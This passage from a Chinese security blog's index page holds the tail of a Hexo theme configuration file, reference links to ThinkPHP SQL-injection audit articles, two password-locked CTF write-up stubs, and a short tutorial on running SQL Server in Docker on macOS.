true</span><br><span class="line">    type: monthly # yearly or monthly</span><br><span class="line">    format: MMMM YYYY # eg: YYYY年MM月</span><br><span class="line">    order: -1 # Sort of order. 1, asc for ascending; -1, desc for descending</span><br><span class="line">    limit: 8 # if set 0 will show all</span><br><span class="line">  card_webinfo:</span><br><span class="line">    enable: true</span><br><span class="line">    post_count: true</span><br><span class="line">    last_push_date: true</span><br><span class="line"></span><br><span class="line"># busuanzi count for PV &#x2F; UV in site</span><br><span class="line"># 訪問人數</span><br><span class="line">busuanzi:</span><br><span class="line">  site_uv: true</span><br><span class="line">  site_pv: false</span><br><span class="line">  page_pv: false</span><br><span class="line"></span><br><span class="line"># Time difference between publish date and now (網頁運行時間)</span><br><span class="line"># Formal: Month&#x2F;Day&#x2F;Year Time or Year&#x2F;Month&#x2F;Day Time</span><br><span class="line">runtimeshow:</span><br><span class="line">  enable: true</span><br><span class="line">  publish_date: 8&#x2F;20&#x2F;2019 00:00:00</span><br><span class="line"></span><br><span class="line"># Aside widget - Newest Comments</span><br><span class="line">newest_comments:</span><br><span class="line">  enable: false</span><br><span class="line">  limit: 6</span><br><span class="line">  avatar: true</span><br><span class="line">  leancloud:</span><br><span class="line">    enable: false</span><br><span class="line">    appId: # leancloud application app id</span><br><span class="line">    appKey: # leancloud application app key</span><br><span class="line">    serverURL: # This configuration is suitable for domestic custom domain name users, overseas version will be automatically detected (no need to manually fill in)</span><br><span class="line">    default_avatar: # mp&#x2F;identicon&#x2F;monsterid&#x2F;wavatar&#x2F;retro&#x2F;robohash&#x2F;blank</span><br><span class="line">  github_issues:</span><br><span class="line">    enable: false</span><br><span class="line">    repo:</span><br><span class="line">  disqus:</span><br><span class="line">    enable: false</span><br><span class="line">    forum:</span><br><span class="line">    api_key:</span><br><span class="line"></span><br><span class="line"># Bottom right button (右下角按鈕)</span><br><span class="line"># --------------------------------------</span><br><span class="line"></span><br><span class="line"># Conversion between Traditional and Simplified Chinese (簡繁轉換)</span><br><span class="line">translate:</span><br><span class="line">  enable: false</span><br><span class="line">  # The text of a button</span><br><span class="line">  default: 繁</span><br><span class="line">  # the language of website (1 - Traditional Chinese&#x2F; 2 - Simplified Chinese）</span><br><span class="line">  defaultEncoding: 2</span><br><span class="line">  # Time delay</span><br><span class="line">  translateDelay: 0</span><br><span class="line">  # The text of the button when the language is Simplified Chinese</span><br><span class="line">  msgToTraditionalChinese: &#39;繁&#39;</span><br><span class="line">  # The text of the button when the language is Traditional Chinese</span><br><span class="line">  msgToSimplifiedChinese: &#39;簡&#39;</span><br><span class="line"></span><br><span class="line"># Read Mode (閲讀模式)</span><br><span class="line">readmode: true</span><br><span class="line"></span><br><span class="line"># dark mode</span><br><span class="line">darkmode:</span><br><span class="line">  enable: true</span><br><span class="line">  # Toggle Button to switch dark&#x2F;light mode</span><br><span class="line">  button: true</span><br><span class="line">  # Switch dark&#x2F;light mode automatically (自動切換 dark mode和 light mode)</span><br><span class="line">  # autoChangeMode: 1  Following System Settings, if the system doesn&#39;t support dark mode, it will switch dark mode between 6 pm to 6 am</span><br><span class="line">  # autoChangeMode: 2  Switch dark mode between 6 pm to 6 am</span><br><span class="line">  # autoChangeMode: false</span><br><span class="line">  autoChangeMode: false</span><br><span class="line"></span><br><span class="line"># Lightbox (圖片大圖查看模式)</span><br><span class="line"># --------------------------------------</span><br><span class="line"># You can only choose one, or neither (只能選擇一個 或者 兩個都不選)</span><br><span class="line"></span><br><span class="line"># medium-zoom</span><br><span class="line"># https:&#x2F;&#x2F;github.com&#x2F;francoischalifour&#x2F;medium-zoom</span><br><span class="line">medium_zoom: false</span><br><span class="line"></span><br><span class="line"># fancybox</span><br><span class="line"># http:&#x2F;&#x2F;fancyapps.com&#x2F;fancybox&#x2F;3&#x2F;</span><br><span class="line">fancybox: true</span><br><span class="line"></span><br><span class="line"># Tag Plugins settings (標籤外掛)</span><br><span class="line"># --------------------------------------</span><br><span class="line"></span><br><span class="line"># mermaid</span><br><span class="line"># see https:&#x2F;&#x2F;github.com&#x2F;knsv&#x2F;mermaid</span><br><span class="line">mermaid:</span><br><span class="line">  enable: false</span><br><span class="line">  # built-in themes: default&#x2F;forest&#x2F;dark&#x2F;neutral</span><br><span class="line">  theme: default</span><br><span class="line"></span><br><span class="line"># Note (Bootstrap Callout)</span><br><span class="line">note:</span><br><span class="line">  # Note tag style values:</span><br><span class="line">  #  - simple    bs-callout old alert style. Default.</span><br><span class="line">  #  - modern    bs-callout new (v2-v3) alert style.</span><br><span class="line">  #  - flat      flat callout style with background, like on Mozilla or StackOverflow.</span><br><span class="line">  #  - disabled  disable all CSS styles import of note tag.</span><br><span class="line">  style: flat</span><br><span class="line">  icons: true</span><br><span class="line">  border_radius: 3</span><br><span class="line">  # Offset lighter of background in % for modern and flat styles (modern: -12 | 12; flat: -18 | 6).</span><br><span class="line">  # Offset also applied to label tag variables. This option can work with disabled note tag.</span><br><span class="line">  light_bg_offset: 0</span><br><span class="line"></span><br><span class="line"># other</span><br><span class="line"># --------------------------------------</span><br><span class="line"></span><br><span class="line"># Artitalk</span><br><span class="line"># see https:&#x2F;&#x2F;artitalk.js.org&#x2F;</span><br><span class="line">artitalk:</span><br><span class="line">  appId:</span><br><span class="line">  appKey:</span><br><span class="line">  option:</span><br><span class="line"></span><br><span class="line"># Pjax [Beta]</span><br><span class="line"># It may contain bugs and unstable, give feedback when you find the bugs.</span><br><span class="line"># https:&#x2F;&#x2F;github.com&#x2F;MoOx&#x2F;pjax</span><br><span class="line">pjax:</span><br><span class="line">  enable: false</span><br><span class="line">  exclude:</span><br><span class="line">    # - xxxx</span><br><span class="line">    # - xxxx</span><br><span class="line"></span><br><span class="line"># Inject the css and script (aplayer&#x2F;meting)</span><br><span class="line">aplayerInject:</span><br><span class="line">  enable: false</span><br><span class="line">  per_page: true</span><br><span class="line"></span><br><span class="line"># Snackbar (Toast Notification 彈窗)</span><br><span class="line"># https:&#x2F;&#x2F;github.com&#x2F;polonel&#x2F;SnackBar</span><br><span class="line"># position 彈窗位置</span><br><span class="line"># 可選 top-left &#x2F; top-center &#x2F; top-right &#x2F; bottom-left &#x2F; bottom-center &#x2F; bottom-right</span><br><span class="line">snackbar:</span><br><span class="line">  enable: false</span><br><span class="line">  position: bottom-left</span><br><span class="line">  bg_light: &#39;#49b1f5&#39; # The background color of Toast Notification in light mode</span><br><span class="line">  bg_dark: &#39;#121212&#39; # The background color of Toast Notification in dark mode</span><br><span class="line"></span><br><span class="line"># Baidu Push (百度推送)</span><br><span class="line">baidu_push: false</span><br><span class="line"></span><br><span class="line"># https:&#x2F;&#x2F;instant.page&#x2F;</span><br><span class="line"># prefetch (預加載)</span><br><span class="line">instantpage: false</span><br><span class="line"></span><br><span class="line"># https:&#x2F;&#x2F;github.com&#x2F;vinta&#x2F;pangu.js</span><br><span class="line"># Insert a space between Chinese character and English character (中英文之間添加空格)</span><br><span class="line">pangu:</span><br><span class="line">  enable: false</span><br><span class="line">  field: site # site&#x2F;post</span><br><span class="line"></span><br><span class="line"># Lazyload (圖片懶加載)</span><br><span class="line"># https:&#x2F;&#x2F;github.com&#x2F;verlok&#x2F;lazyload</span><br><span class="line">lazyload:</span><br><span class="line">  enable: false</span><br><span class="line">  post: &#x2F;img&#x2F;loading.gif</span><br><span class="line"></span><br><span class="line"># PWA</span><br><span class="line"># See https:&#x2F;&#x2F;github.com&#x2F;JLHwung&#x2F;hexo-offline</span><br><span class="line"># ---------------</span><br><span class="line"># pwa:</span><br><span class="line">#   enable: false</span><br><span class="line">#   manifest: &#x2F;image&#x2F;pwa&#x2F;manifest.json</span><br><span class="line">#   apple_touch_icon: &#x2F;image&#x2F;pwa&#x2F;apple-touch-icon.png</span><br><span class="line">#   favicon_32_32: &#x2F;image&#x2F;pwa&#x2F;32.png</span><br><span class="line">#   favicon_16_16: &#x2F;image&#x2F;pwa&#x2F;16.png</span><br><span class="line">#   mask_icon: &#x2F;image&#x2F;pwa&#x2F;safari-pinned-tab.svg</span><br><span class="line"></span><br><span class="line"># Disable Baidu transformation on mobile devices (禁止百度轉碼)</span><br><span class="line">disable_baidu_transformation: true</span><br><span class="line"></span><br><span class="line"># Open graph meta tags</span><br><span class="line"># https:&#x2F;&#x2F;developers.facebook.com&#x2F;docs&#x2F;sharing&#x2F;webmasters&#x2F;</span><br><span class="line">Open_Graph_meta: true</span><br><span class="line"></span><br><span class="line"># Caches the contents in a fragment, speed up the generation (開啟hexo自帶的緩存,加快生成速度)</span><br><span class="line">fragment_cache: true</span><br><span class="line"></span><br><span class="line"># Inject</span><br><span class="line"># Insert the code to head (before &#39;&lt;&#x2F;head&gt;&#39; tag) and the bottom (before &#39;&lt;&#x2F;body&gt;&#39; tag)</span><br><span class="line"># 插入代码到头部 &lt;&#x2F;head&gt; 之前 和 底部 &lt;&#x2F;body&gt; 之前</span><br><span class="line">inject:</span><br><span class="line">  head:</span><br><span class="line">    # - &lt;link rel&#x3D;&quot;stylesheet&quot; href&#x3D;&quot;&#x2F;xxx.css&quot;&gt;</span><br><span class="line">  bottom:</span><br><span class="line">    # - &lt;script src&#x3D;&quot;xxxx&quot;&gt;&lt;&#x2F;script&gt;</span><br><span class="line"></span><br><span class="line"># CDN</span><br><span class="line"># Don&#39;t modify the following settings unless you know how they work</span><br><span class="line"># 非必要請不要修改</span><br><span class="line">CDN:</span><br><span class="line">  # main</span><br><span class="line">  main_css: &#x2F;css&#x2F;index.css</span><br><span class="line">  jquery: https:&#x2F;&#x2F;cdn.jsdelivr.net&#x2F;npm&#x2F;jquery@latest&#x2F;dist&#x2F;jquery.min.js</span><br><span class="line">  main: &#x2F;js&#x2F;main.js</span><br><span class="line">  utils: &#x2F;js&#x2F;utils.js</span><br><span class="line"></span><br><span class="line">  # pjax</span><br><span class="line">  pjax: https:&#x2F;&#x2F;cdn.jsdelivr.net&#x2F;npm&#x2F;pjax&#x2F;pjax.min.js</span><br><span class="line"></span><br><span class="line">  # comments</span><br><span class="line">  gitalk: https:&#x2F;&#x2F;cdn.jsdelivr.net&#x2F;npm&#x2F;</span><br><span class="line">  @latest&#x2F;dist&#x2F;gitalk.min.js</span><br><span class="line">  gitalk_css: https:&#x2F;&#x2F;cdn.jsdelivr.net&#x2F;npm&#x2F;gitalk&#x2F;dist&#x2F;gitalk.min.css</span><br><span class="line">  valine: https:&#x2F;&#x2F;cdn.jsdelivr.net&#x2F;npm&#x2F;valine&#x2F;dist&#x2F;Valine.min.js</span><br><span class="line">  disqusjs: https:&#x2F;&#x2F;cdn.jsdelivr.net&#x2F;npm&#x2F;disqusjs@1&#x2F;dist&#x2F;disqus.js</span><br><span class="line">  disqusjs_css: https:&#x2F;&#x2F;cdn.jsdelivr.net&#x2F;npm&#x2F;disqusjs@1&#x2F;dist&#x2F;disqusjs.css</span><br><span class="line">  utterances: https:&#x2F;&#x2F;utteranc.es&#x2F;client.js</span><br><span class="line">  twikoo: https:&#x2F;&#x2F;cdn.jsdelivr.net&#x2F;npm&#x2F;twikoo&#x2F;dist&#x2F;twikoo.all.min.js</span><br><span class="line"></span><br><span class="line">  # share</span><br><span class="line">  addtoany: https:&#x2F;&#x2F;static.addtoany.com&#x2F;menu&#x2F;page.js</span><br><span class="line">  sharejs: https:&#x2F;&#x2F;cdn.jsdelivr.net&#x2F;npm&#x2F;social-share.js&#x2F;dist&#x2F;js&#x2F;social-share.min.js</span><br><span class="line">  sharejs_css: https:&#x2F;&#x2F;cdn.jsdelivr.net&#x2F;npm&#x2F;social-share.js&#x2F;dist&#x2F;css&#x2F;share.min.css</span><br><span class="line"></span><br><span class="line">  # search</span><br><span class="line">  local_search: &#x2F;js&#x2F;search&#x2F;local-search.js</span><br><span class="line">  algolia_js: &#x2F;js&#x2F;search&#x2F;algolia.js</span><br><span class="line">  algolia_search: https:&#x2F;&#x2F;cdn.jsdelivr.net&#x2F;npm&#x2F;instantsearch.js@2.10.5&#x2F;dist&#x2F;instantsearch.min.js</span><br><span class="line">  algolia_search_css: https:&#x2F;&#x2F;cdn.jsdelivr.net&#x2F;npm&#x2F;instantsearch.js@2.10.5&#x2F;dist&#x2F;instantsearch.min.css</span><br><span class="line"></span><br><span class="line">  # math</span><br><span class="line">  mathjax: https:&#x2F;&#x2F;cdn.jsdelivr.net&#x2F;npm&#x2F;mathjax@3&#x2F;es5&#x2F;tex-mml-chtml.js</span><br><span class="line">  katex: https:&#x2F;&#x2F;cdn.jsdelivr.net&#x2F;npm&#x2F;katex@latest&#x2F;dist&#x2F;katex.min.css</span><br><span class="line">  katex_copytex: https:&#x2F;&#x2F;cdn.jsdelivr.net&#x2F;npm&#x2F;katex-copytex@latest&#x2F;dist&#x2F;katex-copytex.min.js</span><br><span class="line">  katex_copytex_css: https:&#x2F;&#x2F;cdn.jsdelivr.net&#x2F;npm&#x2F;katex-copytex@latest&#x2F;dist&#x2F;katex-copytex.min.css</span><br><span class="line">  mermaid: https:&#x2F;&#x2F;cdn.jsdelivr.net&#x2F;npm&#x2F;mermaid&#x2F;dist&#x2F;mermaid.min.js</span><br><span class="line"></span><br><span class="line">  # count</span><br><span class="line">  busuanzi: &#x2F;&#x2F;busuanzi.ibruce.info&#x2F;busuanzi&#x2F;2.3&#x2F;busuanzi.pure.mini.js</span><br><span class="line"></span><br><span class="line">  # background effect</span><br><span class="line">  canvas_ribbon: https:&#x2F;&#x2F;cdn.jsdelivr.net&#x2F;npm&#x2F;butterfly-extsrc@1&#x2F;dist&#x2F;canvas-ribbon.min.js</span><br><span class="line">  canvas_fluttering_ribbon: https:&#x2F;&#x2F;cdn.jsdelivr.net&#x2F;npm&#x2F;butterfly-extsrc@1&#x2F;dist&#x2F;canvas-fluttering-ribbon.min.js</span><br><span class="line">  canvas_nest: https:&#x2F;&#x2F;cdn.jsdelivr.net&#x2F;npm&#x2F;butterfly-extsrc@1&#x2F;dist&#x2F;canvas-nest.min.js</span><br><span class="line"></span><br><span class="line">  lazyload: https:&#x2F;&#x2F;cdn.jsdelivr.net&#x2F;npm&#x2F;vanilla-lazyload&#x2F;dist&#x2F;lazyload.iife.min.js</span><br><span class="line">  instantpage: https:&#x2F;&#x2F;cdn.jsdelivr.net&#x2F;npm&#x2F;instant.page&#x2F;instantpage.min.js</span><br><span class="line">  typed: https:&#x2F;&#x2F;cdn.jsdelivr.net&#x2F;npm&#x2F;typed.js&#x2F;lib&#x2F;typed.min.js</span><br><span class="line">  pangu: https:&#x2F;&#x2F;cdn.jsdelivr.net&#x2F;npm&#x2F;pangu&#x2F;dist&#x2F;browser&#x2F;pangu.min.js</span><br><span class="line"></span><br><span class="line">  # photo</span><br><span class="line">  fancybox_css: https:&#x2F;&#x2F;cdn.jsdelivr.net&#x2F;npm&#x2F;@fancyapps&#x2F;fancybox@latest&#x2F;dist&#x2F;jquery.fancybox.min.css</span><br><span class="line">  fancybox: https:&#x2F;&#x2F;cdn.jsdelivr.net&#x2F;npm&#x2F;@fancyapps&#x2F;fancybox@latest&#x2F;dist&#x2F;jquery.fancybox.min.js</span><br><span class="line">  medium_zoom: https:&#x2F;&#x2F;cdn.jsdelivr.net&#x2F;npm&#x2F;medium-zoom&#x2F;dist&#x2F;medium-zoom.min.js</span><br><span class="line"></span><br><span class="line">  # snackbar</span><br><span class="line">  snackbar_css: https:&#x2F;&#x2F;cdn.jsdelivr.net&#x2F;npm&#x2F;node-snackbar&#x2F;dist&#x2F;snackbar.min.css</span><br><span class="line">  snackbar: https:&#x2F;&#x2F;cdn.jsdelivr.net&#x2F;npm&#x2F;node-snackbar&#x2F;dist&#x2F;snackbar.min.js</span><br><span class="line"></span><br><span class="line">  # effect</span><br><span class="line">  activate_power_mode: https:&#x2F;&#x2F;cdn.jsdelivr.net&#x2F;npm&#x2F;butterfly-extsrc@1&#x2F;dist&#x2F;activate-power-mode.min.js</span><br><span class="line">  fireworks: https:&#x2F;&#x2F;cdn.jsdelivr.net&#x2F;npm&#x2F;butterfly-extsrc@1&#x2F;dist&#x2F;fireworks.min.js</span><br><span class="line">  click_heart: https:&#x2F;&#x2F;cdn.jsdelivr.net&#x2F;npm&#x2F;butterfly-extsrc@1&#x2F;dist&#x2F;click-heart.min.js</span><br><span class="line">  ClickShowText: https:&#x2F;&#x2F;cdn.jsdelivr.net&#x2F;npm&#x2F;butterfly-extsrc@1&#x2F;dist&#x2F;click-show-text.min.js</span><br><span class="line"></span><br><span class="line">  # fontawesome</span><br><span class="line">  fontawesome: https:&#x2F;&#x2F;cdn.jsdelivr.net&#x2F;npm&#x2F;@fortawesome&#x2F;fontawesome-free&#x2F;css&#x2F;all.min.css</span><br><span class="line"></span><br><span class="line">  # Conversion between Traditional and Simplified Chinese</span><br><span class="line">  translate: &#x2F;js&#x2F;tw_cn.js</span><br><span class="line"></span><br><span class="line">  # justifiedGallery</span><br><span class="line">  justifiedGallery_js: https:&#x2F;&#x2F;cdn.jsdelivr.net&#x2F;npm&#x2F;justifiedGallery&#x2F;dist&#x2F;js&#x2F;jquery.justifiedGallery.min.js</span><br><span class="line">  justifiedGallery_css: https:&#x2F;&#x2F;cdn.jsdelivr.net&#x2F;npm&#x2F;justifiedGallery&#x2F;dist&#x2F;css&#x2F;justifiedGallery.min.css</span><br><span class="line"></span><br><span class="line">  # aplayer</span><br><span class="line">  aplayer_css: https:&#x2F;&#x2F;cdn.jsdelivr.net&#x2F;npm&#x2F;aplayer&#x2F;dist&#x2F;APlayer.min.css</span><br><span class="line">  aplayer_js: https:&#x2F;&#x2F;cdn.jsdelivr.net&#x2F;npm&#x2F;aplayer&#x2F;dist&#x2F;APlayer.min.js</span><br><span class="line">  meting_js: https:&#x2F;&#x2F;cdn.jsdelivr.net&#x2F;gh&#x2F;metowolf&#x2F;MetingJS@1.2&#x2F;dist&#x2F;Meting.min.js</span><br><span class="line"></span><br><span class="line">  # Prism.js</span><br><span class="line">  prismjs_js: https:&#x2F;&#x2F;cdn.jsdelivr.net&#x2F;npm&#x2F;prismjs&#x2F;prism.min.js</span><br><span class="line">  prismjs_lineNumber_js: https:&#x2F;&#x2F;cdn.jsdelivr.net&#x2F;npm&#x2F;prismjs&#x2F;plugins&#x2F;line-numbers&#x2F;prism-line-numbers.min.js</span><br><span class="line">  prismjs_autoloader: https:&#x2F;&#x2F;cdn.jsdelivr.net&#x2F;npm&#x2F;prismjs&#x2F;plugins&#x2F;autoloader&#x2F;prism-autoloader.min.js</span><br><span class="line"></span><br><span class="line">  artitalk: https:&#x2F;&#x2F;cdn.jsdelivr.net&#x2F;npm&#x2F;artitalk</span><br><span class="line"></span><br></pre></td></tr></table></figure>





<h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><p><a target="_blank" rel="noopener" href="https://cyzcc.vip/2020/05/05/ThinkPHP3.2.3/">https://cyzcc.vip/2020/05/05/ThinkPHP3.2.3/</a> ， CYz yyds</p>
<p><a target="_blank" rel="noopener" href="https://mochazz.github.io/2018/04/17/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%20%7C%20ThinkPHP3.2.x%E6%A1%86%E6%9E%B6SQL%E6%B3%A8%E2%BC%8A/#ThinkPHP%E7%AE%80%E4%BB%8B">https://mochazz.github.io/2018/04/17/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%20%7C%20ThinkPHP3.2.x%E6%A1%86%E6%9E%B6SQL%E6%B3%A8%E2%BC%8A/#ThinkPHP%E7%AE%80%E4%BB%8B</a></p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="https://hack-for.fun/773c.html">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="m0nk3y">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="M0nk3y‘s Blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/773c.html" class="post-title-link" itemprop="url">NSSC 2020 9th Final</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2020-12-20 08:46:45" itemprop="dateCreated datePublished" datetime="2020-12-20T08:46:45+08:00">2020-12-20</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2020-12-21 19:08:55" itemprop="dateModified" datetime="2020-12-21T19:08:55+08:00">2020-12-21</time>
              </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          有东西被加密了, 请输入密码查看.
          <!--noindex-->
            <div class="post-button">
              <a class="btn" href="/773c.html#more" rel="contents">
                阅读全文 &raquo;
              </a>
            </div>
          <!--/noindex-->
        
      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="https://hack-for.fun/5880.html">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="m0nk3y">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="M0nk3y‘s Blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/5880.html" class="post-title-link" itemprop="url">MacOS 上使用Docker操作mssql-server</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2020-12-17 21:27:26" itemprop="dateCreated datePublished" datetime="2020-12-17T21:27:26+08:00">2020-12-17</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2020-12-21 19:23:49" itemprop="dateModified" datetime="2020-12-21T19:23:49+08:00">2020-12-21</time>
              </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <blockquote>
<p>….。虽然我书本上的东西不会，但是用手敲的东西，比如数据库和java，不能太拉胯，嘿嘿嘿。所以来好好学一下吧，虽然期末仍然可以操作，懂的都懂。</p>
</blockquote>
<ul>
<li>下载Docker 镜像</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker pull microsoft&#x2F;mssql-server-linux</span><br></pre></td></tr></table></figure>

<ul>
<li>创建并运行容器</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run --name mssql -m 512m -e &#39;ACCEPT_EULA&#x3D;Y&#39;  -e &#39;SA_PASSWORD&#x3D;PassW@rd123&#39; -p 1433:1433 -d microsoft&#x2F;mssql-server-linux</span><br></pre></td></tr></table></figure>

<ul>
<li>进入容器</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">┌─(~)────────────────────────────────────────────────(m0nk3y@RedTeaming:s009)─┐</span><br><span class="line">└─(22:46:24)──&gt; docker rm 808165fefc8f66c26ef70ffb64282f4ca0c745e73fc4a2c3584c8fef583742cf</span><br><span class="line">808165fefc8f66c26ef70ffb64282f4ca0c745e73fc4a2c3584c8fef583742cf</span><br><span class="line">┌─(~)────────────────────────────────────────────────(m0nk3y@RedTeaming:s009)─┐</span><br><span class="line">└─(22:47:11)──&gt; docker run --name mssql -m 512m -e &#39;ACCEPT_EULA&#x3D;Y&#39;  -e &#39;SA_PASSWORD&#x3D;PassW@rd123&#39; --net&#x3D;host -d microsoft&#x2F;mssql-server-linux</span><br><span class="line">ecce2771ff2b6f42b8bb5aa7fd2a7127403268a632edc091df049ff730249387</span><br><span class="line">┌─(~)────────────────────────────────────────────────(m0nk3y@RedTeaming:s009)─┐</span><br><span class="line">└─(22:47:18)──&gt; docker ps                                         ──(四,1217)─┘</span><br><span class="line">CONTAINER ID        IMAGE                          COMMAND                  CREATED             STATUS              PORTS               NAMES</span><br><span class="line">ecce2771ff2b        microsoft&#x2F;mssql-server-linux   &quot;&#x2F;opt&#x2F;mssql&#x2F;bin&#x2F;sqls…&quot;   2 seconds ago       Up 1 second                             mssql</span><br><span class="line">┌─(~)────────────────────────────────────────────────(m0nk3y@RedTeaming:s009)─┐</span><br><span class="line">└─(22:47:20)──&gt; docker ps                                         ──(四,1217)─┘</span><br><span class="line">CONTAINER ID        IMAGE                          COMMAND                  CREATED             STATUS              PORTS               NAMES</span><br><span class="line">ecce2771ff2b        microsoft&#x2F;mssql-server-linux   &quot;&#x2F;opt&#x2F;mssql&#x2F;bin&#x2F;sqls…&quot;   5 seconds ago       Up 4 seconds                            mssql</span><br><span class="line">┌─(~)────────────────────────────────────────────────(m0nk3y@RedTeaming:s009)─┐</span><br><span class="line">└─(22:47:23)──&gt; docker exec -it mssql &#x2F;bin&#x2F;bash                   ──(四,1217)─┘</span><br><span class="line">root@docker-desktop:&#x2F;# id</span><br><span class="line">uid&#x3D;0(root) gid&#x3D;0(root) groups&#x3D;0(root)</span><br><span class="line">root@docker-desktop:&#x2F;#</span><br></pre></td></tr></table></figure>

<ul>
<li>进入容器连接sql server</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@docker-desktop:&#x2F;# &#x2F;opt&#x2F;mssql-tools&#x2F;bin&#x2F;sqlcmd -S localhost -U SA -P &quot;PassW@rd123&quot;</span><br><span class="line">1&gt;</span><br></pre></td></tr></table></figure>

<ol>
<li>如果成功，应会显示 sqlcmd 命令提示符：1&gt;。</li>
</ol>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">└─(22:59:47)──&gt; docker exec -it mssql &#x2F;bin&#x2F;bash             137 ↵ ──(四,1217)─┘</span><br><span class="line">root@30138a7c92f6:&#x2F;# &#x2F;opt&#x2F;mssql-tools&#x2F;bin&#x2F;sqlcmd -S localhost -U SA -P &quot;PassW@rd123&quot;</span><br><span class="line">1&gt; SELECT Name from sys.Databases</span><br><span class="line">2&gt; GO</span><br><span class="line">Name</span><br><span class="line">--------------------------------------------------------------------------------------------------------------------------------</span><br><span class="line">master</span><br><span class="line">tempdb</span><br><span class="line">model</span><br><span class="line">msdb</span><br><span class="line"></span><br><span class="line">(4 rows affected)</span><br><span class="line">1&gt;</span><br></pre></td></tr></table></figure>





<p>![image-20201217231622608](/Users/m0nk3y/Library/Application Support/typora-user-images/image-20201217231622608.png)</p>
<p>OK。</p>
<p>然后就是学习SqlServer的理论加实操了。</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="https://hack-for.fun/b878.html">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="m0nk3y">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="M0nk3y‘s Blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/b878.html" class="post-title-link" itemprop="url">第一届"祥云杯"网络安全大赛总决赛</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2020-12-11 11:24:36" itemprop="dateCreated datePublished" datetime="2020-12-11T11:24:36+08:00">2020-12-11</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2020-12-21 19:08:55" itemprop="dateModified" datetime="2020-12-21T19:08:55+08:00">2020-12-21</time>
              </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          有东西被加密了, 请输入密码查看.
          <!--noindex-->
            <div class="post-button">
              <a class="btn" href="/b878.html#more" rel="contents">
                阅读全文 &raquo;
              </a>
            </div>
          <!--/noindex-->
        
      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
